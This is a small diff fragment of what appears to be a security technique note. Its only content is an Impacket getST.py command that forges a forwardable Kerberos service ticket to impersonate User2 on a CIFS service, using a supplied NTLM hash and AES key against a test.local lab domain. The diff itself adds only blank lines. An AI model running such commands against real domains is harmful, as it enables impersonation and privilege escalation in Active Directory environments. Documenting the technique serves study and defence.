@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:26:20.679788+00:00'
 ```bash
 $ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable
 ```
+
+
